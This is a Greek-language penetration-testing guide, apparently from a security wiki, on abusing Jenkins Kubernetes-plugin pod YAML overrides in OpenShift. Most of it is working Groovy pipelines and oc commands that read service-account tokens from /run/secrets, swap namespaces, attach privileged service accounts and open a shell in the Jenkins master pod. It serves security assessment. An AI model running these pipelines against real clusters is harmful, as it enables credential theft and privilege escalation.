# Jenkins in Openshift - build pod overrides

**Ο αρχικός συγγραφέας αυτής της σελίδας είναι** [**Fares**](https://www.linkedin.com/in/fares-siala/)

## Kubernetes plugin for Jenkins
Αυτό το plugin είναι κυρίως υπεύθυνο για τις βασικές λειτουργίες του Jenkins μέσα σε ένα openshift/kubernetes cluster. Επίσημη τεκμηρίωση [εδώ](https://plugins.jenkins.io/kubernetes/)
Προσφέρει μερικές λειτουργίες όπως η δυνατότητα στους προγραμματιστές να παρακάμψουν ορισμένες προεπιλεγμένες ρυθμίσεις ενός jenkins build pod.

## Core functionnality

Αυτό το plugin επιτρέπει ευελιξία στους προγραμματιστές κατά την κατασκευή του κώδικά τους σε κατάλληλο περιβάλλον.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: maven
image: maven:3.8.1-jdk-8
command:
- sleep
args:
- 99d
''') {
node(POD_LABEL) {
stage('Get a Maven project') {
git 'https://github.com/jenkinsci/kubernetes-plugin.git'
container('maven') {
stage('Build a Maven project') {
sh 'mvn -B -ntp clean install'
}
}
}
}
}
```
## Ορισμένες καταχρήσεις που εκμεταλλεύονται την υπέρβαση yaml pod

Μπορεί ωστόσο να καταχραστεί για να χρησιμοποιήσει οποιαδήποτε προσβάσιμη εικόνα όπως το Kali Linux και να εκτελέσει αυθαίρετες εντολές χρησιμοποιώντας προεγκατεστημένα εργαλεία από αυτή την εικόνα. Στο παρακάτω παράδειγμα μπορούμε να εξάγουμε το token του serviceaccount του τρέχοντος pod.
```groovy
podTemplate(yaml: '''
apiVersion: v1
kind: Pod
spec:
containers:
- name: kali
image: myregistry/mykali_image:1.0
command:
- sleep
args:
- 1d
''') {
node(POD_LABEL) {
stage('Evil build') {
container('kali') {
stage('Extract openshift token') {
sh 'cat /run/secrets/kubernetes.io/serviceaccount/token'
}
}
}
}
}
```
Μια διαφορετική σύνταξη για να επιτευχθεί ο ίδιος στόχος.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Δείγμα για την αντικατάσταση του namespace του pod
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: RANDOM-NAMESPACE
spec:
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Ένα άλλο παράδειγμα που προσπαθεί να προσαρτήσει ένα serviceaccount (το οποίο μπορεί να έχει περισσότερες άδειες από το προεπιλεγμένο, που εκτελεί την κατασκευή σας) με βάση το όνομά του. Μπορεί να χρειαστεί να μαντέψετε ή να απαριθμήσετε τα υπάρχοντα serviceaccounts πρώτα.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: MY_SERVICE_ACCOUNT
containers:
- name: kali-container
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
```
Η ίδια τεχνική ισχύει για να προσπαθήσετε να προσαρτήσετε ένα Secret. Ο τελικός στόχος εδώ θα ήταν να κατανοήσετε πώς να διαμορφώσετε την κατασκευή του pod σας ώστε να μπορείτε αποτελεσματικά να περιστρέψετε ή να αποκτήσετε δικαιώματα.

## Πηγαίνοντας παραπέρα

Μόλις εξοικειωθείτε με αυτό, χρησιμοποιήστε τις γνώσεις σας σχετικά με το Jenkins και το Kubernetes/Openshift για να βρείτε κακοδιαμορφώσεις / καταχρήσεις.

Ρωτήστε τον εαυτό σας τις παρακάτω ερωτήσεις:

- Ποιος λογαριασμός υπηρεσίας χρησιμοποιείται για την ανάπτυξη των pods κατασκευής;
- Ποιους ρόλους και δικαιώματα έχει; Μπορεί να διαβάσει τα μυστικά του namespace στο οποίο βρίσκομαι αυτή τη στιγμή;
- Μπορώ να καταγράψω περαιτέρω άλλα pods κατασκευής;
- Από έναν συμβιβασμένο sa, μπορώ να εκτελέσω εντολές στον κύριο κόμβο/pod;
- Μπορώ να καταγράψω περαιτέρω το cluster για να περιστρέψω αλλού;
- Ποιο SCC έχει εφαρμοστεί;

Μπορείτε να βρείτε ποιες εντολές oc/kubectl να εκδώσετε [εδώ](../openshift-basic-information.md) και [εδώ](../../kubernetes-security/kubernetes-enumeration.md).

### Πιθανά σενάρια privesc/pivoting

Ας υποθέσουμε ότι κατά την αξιολόγησή σας ανακαλύψατε ότι όλες οι κατασκευές jenkins εκτελούνται μέσα σε ένα namespace που ονομάζεται _worker-ns_. Διαπιστώσατε ότι ένας προεπιλεγμένος λογαριασμός υπηρεσίας που ονομάζεται _default-sa_ είναι προσαρτημένος στα pods κατασκευής, ωστόσο δεν έχει τόσα πολλά δικαιώματα εκτός από την πρόσβαση ανάγνωσης σε ορισμένους πόρους, αλλά καταφέρατε να εντοπίσετε έναν υπάρχοντα λογαριασμό υπηρεσίας που ονομάζεται _master-sa_.
Ας υποθέσουμε επίσης ότι έχετε εγκαταστήσει την εντολή oc μέσα στο τρέχον build container.

Με το παρακάτω script κατασκευής μπορείτε να αποκτήσετε έλεγχο του λογαριασμού υπηρεσίας _master-sa_ και να καταγράψετε περαιτέρω.
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
spec:
serviceAccount: master-sa
containers:
- name: evil
image: random_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
sh 'token=$(cat /run/secrets/kubernetes.io/serviceaccount/token)'
sh 'oc --token=$token whoami'
}
}
}
}
}
}
```
Ανάλογα με την πρόσβασή σας, είτε πρέπει να συνεχίσετε την επίθεσή σας από το σενάριο κατασκευής είτε μπορείτε να συνδεθείτε απευθείας ως αυτός ο sa στον τρέχοντα κλάδο:
```bash
oc login --token=$token --server=https://apiserver.com:port
```
Αν αυτός ο sa έχει αρκετά δικαιώματα (όπως pod/exec), μπορείτε επίσης να αναλάβετε τον έλεγχο ολόκληρης της εγκατάστασης jenkins εκτελώντας εντολές μέσα στο pod του master node, αν εκτελείται μέσα στο ίδιο namespace. Μπορείτε εύκολα να εντοπίσετε αυτό το pod μέσω του ονόματός του και από το γεγονός ότι πρέπει να έχει προσαρτημένο ένα PVC (persistent volume claim) που χρησιμοποιείται για την αποθήκευση δεδομένων jenkins.
```bash
oc rsh pod_name -c container_name
```
Σε περίπτωση που το pod του master node δεν εκτελείται μέσα στο ίδιο namespace με τους workers, μπορείτε να δοκιμάσετε παρόμοιες επιθέσεις στοχεύοντας το master namespace. Ας υποθέσουμε ότι ονομάζεται _jenkins-master_. Λάβετε υπόψη ότι το serviceAccount master-sa πρέπει να υπάρχει στο _jenkins-master_ namespace (και μπορεί να μην υπάρχει στο _worker-ns_ namespace)
```groovy
pipeline {
stages {
stage('Process pipeline') {
agent {
kubernetes {
yaml """
metadata:
namespace: jenkins-master
spec:
serviceAccount: master-sa
containers:
- name: evil-build
image: myregistry/mykali_image:1.0
imagePullPolicy: IfNotPresent
command:
- sleep
args:
- 1d
"""
}
}
stages {
stage('Say hello') {
steps {
echo 'Hello from a docker container'
sh 'env'
}
}
}
}
}
}
